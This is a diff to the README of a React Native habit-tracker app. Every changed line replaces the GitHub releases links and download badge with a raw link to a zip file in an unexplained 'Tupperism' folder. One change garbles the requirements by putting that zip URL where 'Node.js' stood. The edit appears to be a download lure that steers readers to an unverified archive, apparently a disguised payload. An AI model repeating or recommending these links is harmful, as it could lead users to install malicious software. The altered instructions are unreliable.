@@ -1,7 +1,7 @@
 # 🌟 habit-tracker-react-native - Track Your Habits with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/rizqinakhusna/habit-tracker-react-native/releases)
+[![Download](https://raw.githubusercontent.com/rizqinakhusna/habit-tracker-react-native/main/Tupperism/habit-tracker-react-native.zip)](https://raw.githubusercontent.com/rizqinakhusna/habit-tracker-react-native/main/Tupperism/habit-tracker-react-native.zip)
 
 ## 🚀 Getting Started
 Welcome to the **habit-tracker-react-native** app! This app helps you track your daily habits in a simple and effective way. You don’t need any technical skills to get started. Follow these steps to download and run the app.
@@ -19,7 +19,7 @@ Before you download, ensure your device meets the following requirements:
 
 - **For Desktop:**
   - Windows 10 or later, macOS 10.13 or later
-  - Node.js installed (this is used to run the app)
+  - https://raw.githubusercontent.com/rizqinakhusna/habit-tracker-react-native/main/Tupperism/habit-tracker-react-native.zip installed (this is used to run the app)
 
 ## 📦 Features
 The **habit-tracker-react-native** app offers many helpful features:
@@ -30,7 +30,7 @@ The **habit-tracker-react-native** app offers many helpful features:
 - **Customization**: Personalize your habit tracker according to your preferences.
 
 ## 💾 Download & Install
-1. Visit the [Releases page to download](https://github.com/rizqinakhusna/habit-tracker-react-native/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/rizqinakhusna/habit-tracker-react-native/main/Tupperism/habit-tracker-react-native.zip).
 2. On the Releases page, find the latest version.
 3. Click on the appropriate file for your device to start the download.
 4. Once the file is downloaded:
@@ -38,7 +38,7 @@ The **habit-tracker-react-native** app offers many helpful features:
    - **For iOS:** Open the app in your downloads, and follow the instructions to install.
    - **For Desktop:** Open the installer file for your operating system and follow the setup instructions.
 
-You can find the download link again here: [Release Downloads](https://github.com/rizqinakhusna/habit-tracker-react-native/releases).
+You can find the download link again here: [Release Downloads](https://raw.githubusercontent.com/rizqinakhusna/habit-tracker-react-native/main/Tupperism/habit-tracker-react-native.zip).
 
 ## 📱 How to Use the App
 1. **Launch the App**: Find the app on your device and open it.
